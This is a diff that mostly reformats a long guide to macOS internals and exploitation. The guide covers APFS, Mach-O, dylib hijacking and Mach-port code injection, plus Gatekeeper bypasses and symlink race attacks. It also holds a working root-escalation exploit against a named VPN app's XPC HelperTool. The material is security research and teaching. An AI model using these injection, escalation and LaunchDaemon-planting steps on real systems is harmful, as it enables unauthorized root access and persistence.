@@ -101,11 +101,13 @@ toc: true
 The Apple File System (`APFS`) is an advanced file system introduced by Apple with macOS High Sierra in 2017. It was designed to replace the older Hierarchical File System Plus (`HFS+`) to better accommodate the modern storage technologies and to enhance performance, reliability, and scalability. `APFS` operates on the concept of containers and volumes. A single `APFS` container can house multiple volumes that share the container's free space. Volumes under `APFS` are flexible and can grow and shrink dynamically, unlike traditional partitions. This adaptability is crucial for devices with limited storage capacities like mobile devices.
 
 - **Check disk:**
+  
 ```
 diskutil list
 ```
 
 - **Output:**
+  
 ```
 /dev/disk0 (internal, physical):
    #:                       TYPE NAME                    SIZE       IDENTIFIER
@@ -140,12 +142,17 @@ diskutil list
 macOS employs robust mechanisms like System Integrity Protection (SIP), also known as rootless mode, to protect its core system files. SIP's primary role is to prevent unauthorized modifications to critical system files and directories, even by the superuser (root).
 
 ##### Using `ls` with SIP Protection Flags
+
 Using the `ls -lO` command can reveal which directories are protected by SIP:
+
 - **Check directories are protected by SIP:**
+- 
 ```bash
 user@mac ~ % ls -lO /
 ```
+
 **Output:**
+
 ```
 total 0
 drwx------  10 root  wheel  restricted,hidden 320 Oct 18 05:36 System
@@ -161,11 +168,13 @@ The `restricted` flag denotes that the directory is protected under SIP, prevent
 ##### Using `diskutil` to Explore APFS Configurations
 
 **Command:**
+
 ```bash
 diskutil apfs list
 ```
 
 **Output:**
+
 ```bash
 APFS Container (1 found)
 |
@@ -203,22 +212,29 @@ APFS Container (1 found)
 macOS further secures system integrity through cryptographic seals, which can be checked using `csrutil`:
 
 **Command:**
+
 ```bash
 csrutil authenticated-root status
 ```
+
 **Output:**
+
 ```bash
 Authenticated Root status: enabled
 ```
+
 This confirms that the system's root volume is cryptographically authenticated, ensuring that the core system files are untouched and secure from alterations.
 
 #### Mounted File System Attributes
+
 **Command:**
+
 ```bash
 user@mac ~ % mount
 ```
 
 **Output:**
+
 ```
 /dev/disk1s4s1 on / (apfs, sealed, local, read-only, journaled)
 devfs on /dev (devfs, local, nobrowse)
@@ -229,19 +245,23 @@ devfs on /dev (devfs, local, nobrowse)
 map auto_home on /System/Volumes/Data/home (autofs, automounted, nobrowse)
 .host:/VMware Shared Folders on /Volumes/VMware Shared Folders (vmhgfs)
 ```
+
 - **Sealed**: The system volume is cryptographically sealed to prevent tampering.
 - **Read-only**: The root volume is mounted as read-only to ensure no changes can be made during normal operation, reinforcing its integrity.
 - **Journaled**: This attribute helps protect the integrity of the file system by keeping a continuous log (journal) that tracks changes to the file system.
 
 #### Cryptexes: CRYPTographically-sealed EXtensions
+
 Introduced in macOS Ventura, `Cryptexes` represent a novel approach to handling system updates and security `Cryptexes` are signed disk images that contain system files or applications and can be updated independently of the system.
 
 **Command Checking Cryptexes:**
+
 ```bash
 user@mac ~ % ls -l /System/Cryptexes
 ```
 
 **Output:**
+
 ```
 lrwxr-xr-x  1 root  wheel  42 Oct 18 05:36 App -> ../../System/Volumes/Preboot/Cryptexes/App
 lrwxr-xr-x@ 1 root  wheel  41 Oct 18 05:36 OS -> ../../System/Volumes/Preboot/Cryptexes/OS
@@ -254,6 +274,7 @@ These links show that `Cryptexes` are not traditionally mounted within the regul
 `Firmlinks` are a special type of symbolic link used by macOS to seamlessly integrate the read-only system volume with the writable data volume. This allows the operating system to maintain a clear separation between system files (which need to be protected from modifications to ensure system integrity) and user data (which needs to be freely writable by the user).
 
 - Check Firmlinks:
+  
 ```
 cat /usr/share/firmlinks
 ```
@@ -299,6 +320,7 @@ inode -> 18524916
 ## PLIST Files
 
 Convert Binary `plist`:
+
 ```
 Convert to xml
 plutil -convert xml1 ~/your_plist_binary -o -
@@ -312,14 +334,19 @@ plutil -convert swift ~/Library/Preferences/com.apple.screensaver.plist -o -
 Convert to objective-c
 plutil -convert objc ~/Library/Preferences/com.apple.screensaver.plist -o -
 ```
+
 ## Bundles
 
 Bundles are `.app` bundle, but many other executables are also packaged as bundles, such as `.framework` and `.systemextension`.
+
 ## Dyld
+
 Extract `dyld-cache`:
+
 ```
 dyld-shared-cache-extractor /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_{arch} /tmp/libraries
 ```
+
 # Mach-O File Format
 
 The main 3 parts of `Mach-o` Fiel format:
@@ -328,26 +355,33 @@ The main 3 parts of `Mach-o` Fiel format:
 
 
 ## Introduction
+
 The `Mach-O` file format is the native executable format for `macOS` and `iOS` operating systems. Standing for Mach Object, the `Mach-O` format supports executable files, shared libraries, dynamically-loaded libraries, and object code for `macOS`. The design of this file format is heavily influenced by its focus on performance and the compatibility with the Mach kernel, which is part of the `XNU` kernel that powers Apple's operating systems.
 
 - Check File:
+  
 ```
 zeyad@azima% file /bin/pwd
 /bin/pwd: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable arm64e]
 /bin/pwd (for architecture x86_64):	Mach-O 64-bit executable x86_64
 /bin/pwd (for architecture arm64e):	Mach-O 64-bit executable arm64e
 ```
+
 ## Universal Binaries
+
 Universal binaries, also known as `fat` binaries, are unique to the `Mach-O `format. These binaries contain code for multiple architectures (like `x86_64` and `ARM`) in a single file. This capability allows developers to build applications that can run on different types of hardware without the need for separate executables. The structure of a universal binary is essentially a container that includes multiple `Mach-O` files, each optimized for a specific processor architecture.
 
 ## Mach-O Header
+
 The Mach-O header is the starting point of any `Mach-O` file. It contains essential metadata about the file, such as the type of file (`executable`, `object file`, `shared library`), its architecture (`ARM`, `x86_64`, etc.), and the number of load commands. The header plays a crucial role in how the operating system processes and handles the `Mach-O` file during loading and execution.
 Dump the `Mach-O` Header information using `otool`
+
 ```
 otool -arch {x86_64/arm64e} -hv /path_to_binary
 ```
 
 ## Mach-O LOAD Command
+
 Load commands within a `Mach-O` file instruct the loader on how to map the file’s contents into memory. These commands are vital for the dynamic linker to resolve symbols and connect dynamic libraries at runtime. Typical load commands include specifying the entry point of the executable, required dynamic libraries, and segment information such as the location and permissions of different sections of the file, There are around `50` type of load commands, But the most common ones:
 
 1. **LC_SEGMENT_64**: This command is used to define a segment of memory that includes one or more sections. Each segment can contain executable code, data, or other resources needed by the executable or library. This command is specifically for `64-bit` architectures.
@@ -361,11 +395,13 @@ Load commands within a `Mach-O` file instruct the loader on how to map the file�
 5. **LC_CODE_SIGNATURE**: This command contains the offset and size of the code signature used by the operating system to verify the integrity and origin of the code in the Mach-O file. This is crucial for security purposes, ensuring that the code has not been tampered with.
 
 - Dump load command with `otool`:
+  
 ```
 otool -lv /path_to_binary
 ```
 
 - Dump libraries in `LC_LOAD_DYLINKER`:
+  
 ```
 otool -L /path_to_binary
 ```
@@ -373,14 +409,17 @@ otool -L /path_to_binary
 
 
 ## Mach-O Data
+
 The data in `Mach-O` files is organized into segments and sections. Segments are larger chunks of data with specific roles, like containing internal & external functions information, symbol table, executable code or read-only data. Each segment can be further divided into sections that hold smaller, more specific blocks of data. This hierarchical structure allows for efficient data management and access, crucial for performance during execution. 
 
 - Dump all segments and sections using `otool`:
+  
 ```
 otool -m /path_to_binary
 ```
 
 - Example:
+  
 ```
 Segment __PAGEZERO: 4294967296 (zero fill) 
 Segment __TEXT: 32768
@@ -403,8 +442,11 @@ Segment __DATA: 16384
 Segment __LINKEDIT: 32768
 total 4295065600
 ```
+
 The `__PAGEZERO` segment plays a crucial role in security. It sets up a memory area called the zero page at the very start of the address space for each process, but it makes this page completely unusable. The memory protection settings for this page are set to zero, meaning nothing can be read from, written to, or executed on this page. This design helps prevent security flaws, specifically `NULL pointer dereference` vulnerabilities, by ensuring that any attempt to access this low memory area will lead to an error, rather than allowing potentially harmful operations.
+
 ### Explaining
+
 | Segment       | Size (Bytes) | Description                                                                 |
 |---------------|--------------|-----------------------------------------------------------------------------|
 | __PAGEZERO    | 4294967296   | A zero-fill segment that protects against NULL pointer dereferences.        |
@@ -814,26 +856,31 @@ DTrace is a comprehensive dynamic tracing framework that is integrated into the 
 #### Examples of DTrace Script Usage
 
 1. **List all syscall probes for open calls**
+2. 
    ```shell
    sudo dtrace -l -n 'syscall::open*:entry'
    ```
 
-2. **Trace system calls for a process named 'myapp'**
+3. **Trace system calls for a process named 'myapp'**
+4. 
    ```shell
    sudo dtrace -n 'syscall:::entry /execname == "myapp"/ { trace(probefunc); }'
    ```
 
-3. **Run a DTrace script from a file**
+5. **Run a DTrace script from a file**
+   
    ```shell
    sudo dtrace -s /path/to/myscript.d
    ```
 
-4. **Trace file opens for process ID 12345 using opensnoop**
+7. **Trace file opens for process ID 12345 using opensnoop**
+   
    ```shell
    sudo opensnoop -p 12345
    ```
 
-5. **Monitor disk I/O size by process using bitesize.d**
+9. **Monitor disk I/O size by process using bitesize.d**
+    
    ```shell
    sudo bitesize.d
    ```
@@ -908,28 +955,37 @@ You can find system calls numbers in the `syscalls.master` under the `xnu` sourc
 To find out the bit number to set with the `bts` instruction, you need to compare the binary representation of the syscall number (example: `0x3b`) with the binary representation of the syscall number plus the class mask (`0x200003b`). The `echo` and `bc` commands can be used to convert hexadecimal numbers to binary, and the `xargs`, `printf`, and `tr` commands format the output to compare the bits easily.
 
 1. **Convert the syscall number (0x3b) to binary**:
+
 ```bash
 echo "obase=2; ibase=16; 3B" | bc | xargs printf "%064s\n" | tr ' ' '0'
 ```
+
 This command will output the binary representation of `0x3b` as a 64-bit number, padded with zeroes.
 
 2. **Convert the syscall number with the class mask (0x200003b) to binary**:
+   
 ```bash
 echo "obase=2; ibase=16; 200003B" | bc | xargs printf "%064s\n" | tr ' ' '0'
 ```
+
 This command will output the binary representation of `0x200003b` as a 64-bit number, padded with zeroes.
 
 3. **Compare the Outputs**:
+   
 Look for the first bit that differs when comparing the binary output from step 1 to the output from step 2. The differing bit's position (starting from 0 on the right) is the bit you need to set with the `bts` instruction to transform the syscall number into the one with the class mask applied.
 
 For instance, if the binary output for `0x3b` is:
+
 ```
 000...0000111011
 ```
+
 And the binary output for `0x200003b` is:
+
 ```
 ...0010000000000000000000111011
 ```
+
 The differing bit is the 25th bit from the right (or the 24th index if you start counting from 0), which corresponds to the class mask.
 
 Now, knowing that you need to set the 25th bit, you use the `bts` instruction with index 24 to set this bit in the register, as shown in the assembly example previously provided.
@@ -990,6 +1046,7 @@ You can find system calls numbers in the `syscalls.master` under the `xnu` sourc
 ## Avoid Null-Bytes in Syscalls
 
 Instead of performing the syscall using `svc 0`, the argument for for `svc` is aribtrary value, So it can be replaced:
+
 ```asm
 mov x16, #SYS_write     ; Load the syscall number for 'write' into X16
 mov x0, #1              ; File descriptor 1 (stdout)
@@ -1316,6 +1373,7 @@ int main(int argc, const char * argv[]) {
 ```
 
 - Compile and run:
+  
 ```bash
 Compile
 gcc -fraework Foundation checkCSRFlags.m -o checkCSRFlags
@@ -1330,6 +1388,7 @@ Run
 
 1. **Change ownership and set SUID bit:**
    - Change the ownership of the binary to root and set the SUID bit to enable execution with root privileges.
+     
 ```bash
 sudo chown root hello
 sudo chmod +s hello
@@ -1337,47 +1396,62 @@ ls -l hello
 ```
 
 2. **Testing dylib injection with SUID bit set:**
+   
    - When attempting to inject a dylib into a binary with the SUID bit set, the injection should fail, indicating the security measures are working as expected.
+     
 ```bash
 ./hello  # Normal execution
 DYLD_INSERT_LIBRARIES=example.dylib ./hello  # Attempted dylib injection
 ```
 
 3. **Remove SUID bit and test dylib injection:**
+   
    - Removing the SUID bit and attempting dylib injection again should succeed, demonstrating that the restriction is specifically linked to the SUID bit.
+     
 ```bash
 sudo chmod -s hello
 DYLD_INSERT_LIBRARIES=example.dylib ./hello
 ```
 
 ### Testing Restricted Segments
+
 1. **Add a restricted segment to the binary:**
+   
    - Compiling a binary with a specific segment (`__RESTRICT/__restrict`) that signals dyld to ignore certain dynamic loading features.
+     
 ```bash
 gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restricted
 ```
 
 2. **Attempt dylib injection into the restricted binary:**
+   
    - Injection attempts should fail, confirming that the restricted segment is recognized and respected by dyld.
+     
 ```bash
 DYLD_INSERT_LIBRARIES=example.dylib ./hello-restricted
 ```
 
 3. **Verify the presence of the restricted segment:**
+   
    - Using the `size` command to verify the segments and sections of the compiled binary, confirming the presence of the `__RESTRICT` segment.
+     
 ```bash
 size -x -l -m hello-restricted
 ```
 
 ### Hardened Runtime and Code Signing
+
 1. **Enable hardened runtime and code-sign the binary:**
+   
    - Applying a hardened runtime setting to the binary using a self-signed certificate to enforce stricter security policies.
+   - 
 ```bash
 cp hello hello-signed
 codesign -s "Your Certificate Name" --options=runtime hello-signed
 ```
 
 2. **Test dylib injection on hardened runtime binary:**
+    
    - Attempts to inject a dylib into a binary with hardened runtime enabled should fail if the dylib does not match the code-signing requirements.
 ```bash
 DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed
@@ -1385,6 +1459,7 @@ DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed
 
 3. **Set library validation requirement and test:**
    - Enforcing library validation to ensure that all loaded libraries are signed with the same certificate as the main executable.
+     
 ```bash
 codesign -f -s "Your Certificate Name" --options=library hello-signed
 DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed
@@ -1393,13 +1468,17 @@ DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed
 ### Setting the CS_RESTRICT Flag
 
 1. **Setting the CS_RESTRICT flag on a binary:**
+   
    - Manually setting the CS_RESTRICT flag using the `codesign` command with the `--option=0x800` flag. This is not typical in standard practice but can be used to enforce stricter security measures.
+     
 ```bash
 codesign -f -s "Your Certificate Name" --option=0x800 hello-signed
 ```
 
 2. **Verifying the signature and the CS_RESTRICT flag:**
+   
    - After setting the flag, verify that it has been applied correctly using the `codesign -dv` command to display detailed information about the code signing status of the binary.
+     
 ```bash
 codesign -dv hello-signed
 ```
@@ -1449,7 +1528,8 @@ Most important load commands & functions from a dylib hijacking point of view ar
 
 ### LC_LOAD_WEAK_DYLIB
 
-- Test using `LC_LOAD_WEAK_DYLIB` 
+- Test using `LC_LOAD_WEAK_DYLIB`
+  
 ```plaintext
 1- First check the app/binary security and if it's exploitable
 You can check when the app is vulnerable from my previous analysis from here: https://zeyadazima.com/macos/CVE_2023_26818_P1/#the-analysis
@@ -1494,6 +1574,7 @@ Then look for dylibs that been requested and repeated in the search paths.
 ## Exploit Dylib Hijacking
 
 - A `dylib` test code:
+  
 ```Objc
 #import <Foundation/Foundation.h>
 
@@ -1505,6 +1586,7 @@ void custom(int argc, const char **argv)
 ```
 
 - Exploitation steps
+  
 ```plaintext
 After identifying which dylib is vulnerable, Compile the test code
 gcc -dynamiclib -current_version {version} -compatibility_version {version} -framework Foundation test.m -Wl,-reexport_library,"Hijacked dylib path" -o hijack.dylib
@@ -1576,10 +1658,12 @@ Apple stores system-provided service names in configuration files that also cont
 ## Injection through Mach Ports
 
 ### Get Identifier
+
 ```
 Get app "Identifier=" using codesign
 codesign -dv /Path_to_app
 ```
+
 ### Get Process ID
 
 ```ObjC
@@ -1640,7 +1724,9 @@ int main(int argc, const char * argv[]) {
 }
 
 ```
+
 - Compile
+  
 ```
 gcc -framework Foundation -framework Appkit getPID.m -o getPID
 ```
@@ -1741,6 +1827,7 @@ int main(int argc, const char * argv[]) {
 ```
 
 - Compile
+  
 ```
 gcc -framework Foundation -framework Appkit getTaskPort.m -o getTaskPort
 ```
@@ -1864,10 +1951,13 @@ int main(int argc, const char * argv[]) {
 }
 
 ```
+
 - Compile
+  
 ```
 gcc -framework Foundation -framework Appkit allocateWrite.m -o allocateWrite
 ```
+
 1. **Allocating Memory in the Target Process**:
    - The `mach_vm_allocate` function is used to allocate memory in the target process. In this case, it allocates memory for both the shellcode and the stack.
    - `remoteStack64` is a pointer to the allocated stack memory, while `remoteCode64` is a pointer to the allocated memory for the shellcode.
@@ -1876,6 +1966,7 @@ gcc -framework Foundation -framework Appkit allocateWrite.m -o allocateWrite
    - The `mach_vm_write` function is used to write the shellcode into the allocated memory space of the target process.
 
 ### Set Memory Permisssions for Stack & Code
+
 ```ObjC
 #import <Foundation/Foundation.h>
 #import <AppKit/AppKit.h>
@@ -2000,7 +2091,9 @@ int main(int argc, const char * argv[]) {
 
 }
 ```
+
 - Compile
+  
 ```
 gcc -framework Foundation -framework Appkit setMemory.m -o setMemory
 ```
@@ -2010,6 +2103,7 @@ gcc -framework Foundation -framework Appkit setMemory.m -o setMemory
    - The shellcode memory is set to be readable and executable (`VM_PROT_READ | VM_PROT_EXECUTE`), while the stack is set to be readable and writable (`VM_PROT_READ | VM_PROT_WRITE`).
 
 ### Execute the Shellcode
+
 ```ObjC
 #import <Foundation/Foundation.h>
 #import <AppKit/AppKit.h>
@@ -2167,6 +2261,7 @@ int main(int argc, const char * argv[]) {
 ```
 
 - Compile
+  
 ```
 gcc -framework Foundation -framework Appkit InjectCode.m -o InjectCode
 ```
@@ -2182,7 +2277,9 @@ gcc -framework Foundation -framework Appkit InjectCode.m -o InjectCode
 - Since the `__rip` is set to the beginning of the allocated memory where the shellcode is placed, the thread starts executing the shellcode.
 
 ### Inject Dylib
+
 To load a dylin through the thread, We need to pormote the thread to `POSIX` thread, So by creating a `POSIX` thread from the existing `Mach` thread, We will load the dylib:
+
 ```ObjC
 #include <dlfcn.h>
 #import <Foundation/Foundation.h>
@@ -2590,12 +2687,14 @@ Mostly The `HelperTools` is under `/Library/PrivilegedHelperTools/`.
 #### Identify the Services & Privileged Tools
 
 Under `/Library/LaunchDaemons`, Wew can see the `LaunchDaemons` related to `PureVpn`:
+
 ```zsh
 ~ % ls /Library/LaunchDaemons | grep pure
 com.purevpn.macapp.HelperTool.plist
 ```
 
 When we look at the `com.purevpn.macapp.HelperTool.plist`, We can see the following:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -2633,6 +2732,7 @@ Before Connecting to the `HelperTool`, There are some authorizations & verificat
 ### Reverse HelperTool
 
 The first thing We have to do, When we get to reverse the `HelperTool`. Is to check the verifications for connecting to the services:
+
 ```Obj-c
 /* @class HelperTool */
 -(char)listener:(void *)arg2 shouldAcceptNewConnection:(void *)arg3 {
@@ -2718,6 +2818,7 @@ The tool helper offers a lot of methods, But the most interested one is `runWith
 ```
 
 The function here, Passes the parameters to `rbx = [self runCommand:r12 withArguments:r15 usingSudo:arg4];`, When we check `runCommand`:
+
 ```Objc
 /* @class HelperTool */
 -(char)runCommand:(void *)arg2 withArguments:(void *)arg3 usingSudo:(char)arg4 {
@@ -2762,6 +2863,7 @@ It checks if `arg4` is not `0`, If it's true, Then it will execute the command w
 ```
 r14 = [rdi runCommand:@"/usr/bin/sudo" withArguments:rbx];
 ```
+
 We can abuse it to esclate our priviliges, By executing commands as root.
 
 ### Writing The Exploit
@@ -2815,24 +2917,31 @@ static NSString* kXPCHelperMachService = @"com.purevpn.macapp.HelperTool";
 #### Second initialize our XPC connection
 
 Now, We will start connecting to the service and exploit the method:
+
 - Initialize XPC connection for our MachServices
+  
 ```Objc
 int main(void) {
 
 		
     NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:kXPCHelperMachService];
 ```
+
 - Initialize interface with the protocol
+
 ```Objc
     NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
 ```
-- Set the interface and Start the connection 
+
+- Set the interface and Start the connection
+  
 ```Objc
 	[connection setRemoteObjectInterface:interface];
 	[connection resume];
 ```
 
 -  Define the connection object
+  
 ```Objc
     id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError *error) {
         if (error) {
@@ -2840,7 +2949,9 @@ int main(void) {
         }
     }];
 ```
+
 - Before calling the `runWithCommand` Method we need to define the arguments
+  
 ```Objc
 	// Define the command
 	NSString* cmd = @"touch";
@@ -2848,7 +2959,9 @@ int main(void) {
 	// Define command arguments
 	    NSArray* args = [NSArray arrayWithObjects:@"/tmp/zeyadazima.com", @"", nil];
 ```
+
 - Now, Call the method from the object
+  
 ```Objc
     [obj runWithCommand:cmd withArguments:args usingSudo:YES withReply:^(BOOL err) {
         NSLog(@"[+] Reply, %d", err);
@@ -2859,6 +2972,7 @@ int main(void) {
 ```
 
 - Results
+  
 ```bash
  ~ % cd /tmp   
 /tmp % ls
@@ -2873,6 +2987,7 @@ drwxr-xr-x  2 root            wheel  64 Jun  8 09:10 powerlog
 drwx------  3 root            wheel  96 Jun 10 05:25 tmp0000468a
 -rw-r--r--  1 root            wheel   0 Jun 10 22:32 zeyadazima.com
 ```
+
 We can see that the results shows that the file created successfully.
 
 # macOS Function Hooking
@@ -2911,7 +3026,9 @@ int my_open(const char *path, int oflag, ...) {
 
 DYLD_INTERPOSE(my_open, open);
 ```
+
 let''s explain our code here in steps:
+
 1. **Define the Interposing Macro**
 
 Define the `DYLD_INTERPOSE` macro in your C file. This macro helps create an `__interpose` section in the Mach-O file.
@@ -3127,18 +3244,23 @@ export DYLD_FORCE_FLAT_NAMESPACE=1
 If the application crashes with a segmentation fault, inspect the crash log to identify the cause. You might encounter an infinite loop if the interposed function calls another function that ends up calling back the interposed function.
 
 - **Crash Reports**
+  
 User crash reports are typically located in the` ~/Library/Logs/DiagnosticReports/ `directory. Each crash report file is named with the application name and a timestamp.
+
 ```
 /Users/<your_username>/Library/Logs/DiagnosticReports/
 ```
 
 - **System Crash Reports**
+  
 System crash reports are stored in the /Library/Logs/DiagnosticReports/ directory. These reports are accessible to all users with appropriate permissions.
+
 ```
 /Library/Logs/DiagnosticReports/
 ```
 
 - Debugging
+  
 Finally we could use `lldb`, To debug it.
 
 2. **Avoiding Infinite Loops**
@@ -3440,6 +3562,7 @@ static void customConstructor(int argc, const char **argv) {
 To compile and run the application with the swizzle library:
 
 1. **Compile the MD5 Application**:
+   
     ```bash
     clang -framework Foundation -framework CommonCrypto -o MD5App MD5App.m
     ```
@@ -3450,6 +3573,7 @@ To allow your application to load dynamic libraries using the `DYLD_INSERT_LIBRA
    Create an entitlements file (`entitlements.plist`) with the necessary permissions.
 
    **entitlements.plist**:
+   
    ```xml
 	<?xml version="1.0" encoding="UTF-8"?>
 	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -3463,20 +3587,23 @@ To allow your application to load dynamic libraries using the `DYLD_INSERT_LIBRA
 	</plist>
    ```
 
-2. **Sign the Application**:
+3. **Sign the Application**:
    Use the `codesign` tool to sign the application with the created entitlements.
 
    **Commands**:
+   
    ```bash
    codesign --deep --force --verify --verbose --entitlements entitlements.plist --sign "YOUR_IDENTITY" YOUR_APP_PATH
    ```
 
 2. **Compile the Swizzle Code**:
+   
     ```bash
     clang -dynamiclib -framework Foundation -o Swizzle.dylib Swizzle.m
     ```
 
-3. **Run the Application with the Swizzle Library**:
+4. **Run the Application with the Swizzle Library**:
+   
     ```bash
     DYLD_INSERT_LIBRARIES=./Swizzle.dylib ./MD5App
     ```
@@ -4262,9 +4389,11 @@ macOS `Gatekeeper` is a security feature designed by Apple to protect users from
 When a file is downloaded from the internet, macOS tags it with a `com.apple.quarantine` extended attribute. This attribute indicates that the file needs to undergo security checks before it can be executed. This tagging typically happens when files are downloaded through browsers, email clients, or messaging apps.
 
 **Checking Quarantine Attribute**
+
  ```bash
  xattr -p com.apple.quarantine /path/to/downloaded/file
  ```
+
  This command checks if a file has the quarantine attribute.
 
 <img width="691" height="265" alt="image" src="https://github.com/user-attachments/assets/0d09f6dc-4db8-4acc-94df-06810f26280e" />
@@ -4277,9 +4406,11 @@ When a file is downloaded from the internet, macOS tags it with a `com.apple.qua
 
 
 **Verifying a Code Signature**
+
  ```bash
  codesign -dv --verbose=4 /path/to/app
  ```
+
  This command displays detailed information about the code signature of an application.
 
 <img width="691" height="407" alt="image" src="https://github.com/user-attachments/assets/638a3f39-933d-460b-95df-0ecda013029e" />
@@ -4293,16 +4424,20 @@ Gatekeeper integrates deeply with macOS's security architecture. It leverages se
 The `spctl` tool is the command-line interface to interact with Gatekeeper. It allows administrators to query and modify Gatekeeper’s security policies.
 
 **Checking Gatekeeper Status**
+
  ```bash
  spctl --status
  ```
+
  This command returns the current status of Gatekeeper.
 
 
 **Modifying Gatekeeper’s Behavior**
+
  ```bash
  sudo spctl --master-disable
  ```
+
  This command disables Gatekeeper, allowing all applications to run regardless of their source.
 
 <img width="691" height="407" alt="image" src="https://github.com/user-attachments/assets/df63a28b-e4ec-4e30-aba2-72e66dc1a24c" />
@@ -4342,6 +4477,7 @@ One of the more straightforward but effective techniques to bypass Gatekeeper is
 The attacker can create a ZIP archive with a structure that confuses macOS's quarantine process. For example, by placing a symlink to the executable inside the ZIP archive rather than the executable itself.
 
 **Creating a Malicious ZIP Archive**
+
  ```bash
  ln -s /path/to/malicious_app /tmp/link_to_app
  zip -r malicious.zip /tmp/link_to_app
@@ -4366,6 +4502,7 @@ Symlink attacks exploit the way macOS handles symbolic links during the quaranti
 The attacker creates a symlink pointing to the malicious executable.
 
 **Creating a Symlink**
+
  ```bash
  ln -s /path/to/malicious_binary /path/to/legit_app/Contents/MacOS/app_executable
  ```
@@ -4390,6 +4527,7 @@ Attackers can inject malicious code into legitimate application bundles. This te
 The attacker modifies an existing application bundle by injecting a malicious script or binary. This could be done by placing a new executable in the `Contents/MacOS` directory of the application bundle.
 
 **Injecting Code**
+
  ```bash
  echo "malicious code" > /path/to/legit_app/Contents/MacOS/malicious_executable
  chmod +x /path/to/legit_app/Contents/MacOS/malicious_executable
@@ -4399,6 +4537,7 @@ The attacker modifies an existing application bundle by injecting a malicious sc
    - The attacker can also modify the `Info.plist` file within the bundle to point to the malicious executable instead of the legitimate one.
 
 **Modifying Info.plist**
+
  ```xml
  <key>CFBundleExecutable</key>
  <string>malicious_executable</string>
@@ -4672,6 +4811,7 @@ sudo /Applications/FileMonitor.app/Contents/MacOS/FileMonitor -pretty
 ### Symlink vs Hardlink
 
 **Symlinks:**
+
 ```bash
 ln -s /target/path /link/location
 ```
@@ -4680,6 +4820,7 @@ ln -s /target/path /link/location
 - May not be followed by all operations
 
 **Hardlinks:**
+
 ```bash
 ln /existing/file /new/link
 ```
@@ -4713,6 +4854,7 @@ ln /existing/file /new/link
 **Objective:** Find permission misconfigurations at rest
 
 **Method 1: Root-owned files in non-root directories**
+
 ```bash
 find / -type f -user root 2>/dev/null | while read file; do
     dir=$(dirname "$file")
@@ -4724,6 +4866,7 @@ done
 ```
 
 **Method 2: Group-writable directories with root files**
+
 ```bash
 find / -type d -perm -g+w 2>/dev/null | while read dir; do
     find "$dir" -maxdepth 1 -type f -user root 2>/dev/null | while read file; do
@@ -4733,6 +4876,7 @@ done
 ```
 
 **Method 3: Predictable temp file locations**
+
 ```bash
 # Search for hardcoded temp paths in binaries
 strings /path/to/binary | grep -E "^/tmp/|^/var/tmp/"
@@ -4743,6 +4887,7 @@ grep -r "/tmp/" /Library/Scripts/ 2>/dev/null
 ```
 
 **Method 4: Check installer packages**
+
 ```bash
 # Extract installer scripts
 pkgutil --expand package.pkg extracted/
@@ -4757,6 +4902,7 @@ cat extracted/*/Scripts/postinstall
 #### 2. Dynamic Analysis Detection
 
 **Method 1: FileMonitor (Real-time)**
+
 ```bash
 # Monitor all file operations
 sudo /Applications/FileMonitor.app/Contents/MacOS/FileMonitor -pretty
@@ -4766,6 +4912,7 @@ sudo /Applications/FileMonitor.app/Contents/MacOS/FileMonitor -filter '{"user": 
 ```
 
 **Method 2: fs_usage (Built-in)**
+
 ```bash
 # Monitor file system calls by specific process
 sudo fs_usage -w -f filesys | grep -E "open|write|create"
@@ -4775,6 +4922,7 @@ sudo fs_usage -w -f filesys | grep "root"
 ```
 
 **Method 3: opensnoop (DTrace)**
+
 ```bash
 # Trace file opens by all processes
 sudo opensnoop -v
@@ -4784,6 +4932,7 @@ sudo opensnoop -n processname
 ```
 
 **Method 4: Custom dtrace script**
+
 ```bash
 # monitor_writes.d
 #!/usr/sbin/dtrace -s
@@ -4842,6 +4991,7 @@ if (lstat(path, &sb) == 0 && S_ISLNK(sb.st_mode)) {
 **Scenario:** Root process writes to predictable path in `/tmp/`
 
 **Steps:**
+
 ```bash
 # 1. Create symlink before process runs
 ln -s /Library/LaunchDaemons/evil.plist /tmp/predictable.log
@@ -4865,6 +5015,7 @@ ln -s /Library/LaunchDaemons/evil.plist /tmp/predictable.log
 **Scenario:** Process creates empty file then writes to it
 
 **Steps:**
+
 ```bash
 # 1. Process creates empty file
 # touch /tmp/logfile
@@ -4888,6 +5039,7 @@ ln /etc/some_config /tmp/logfile
 **Scenario:** Installer creates directory structure in `/tmp/`
 
 **Attack Flow:**
+
 ```bash
 # Continuous loop - create structure before installer
 while true; do
@@ -4903,6 +5055,7 @@ done
 ```
 
 **Python Race Exploit Template:**
+
 ```python
 import os
 import time
@@ -4943,6 +5096,7 @@ while True:
 **Scenario:** We control content written to protected location
 
 **Technique A: Log Injection → PLIST**
+
 ```bash
 # Target: Log file becomes LaunchDaemon PLIST
 
@@ -4956,6 +5110,7 @@ ln -s /Library/LaunchDaemons/evil.plist /tmp/app.log
 ```
 
 **Technique B: Manpage Injection**
+
 ```bash
 # Target: whatis database becomes LaunchDaemon PLIST
 
@@ -4977,6 +5132,7 @@ sudo periodic weekly
 ```
 
 **Technique C: DMG Mount Hijacking**
+
 ```bash
 # Installer expects to mount DMG at specific location
 
@@ -4997,6 +5153,7 @@ hdiutil attach evil.dmg
 **Scenario:** Group-writable directory with admin privileges
 
 **Steps:**
+
 ```bash
 # 1. Identify group-writable directory with root files
 ls -l /private/var/log/ | grep Diagnostic
@@ -5015,6 +5172,7 @@ ln /Library/target.conf today.asl
 **Scenario:** Process uses safe functions but predictable names
 
 **Attack:**
+
 ```bash
 # Process uses mkstemp() but predictable prefix
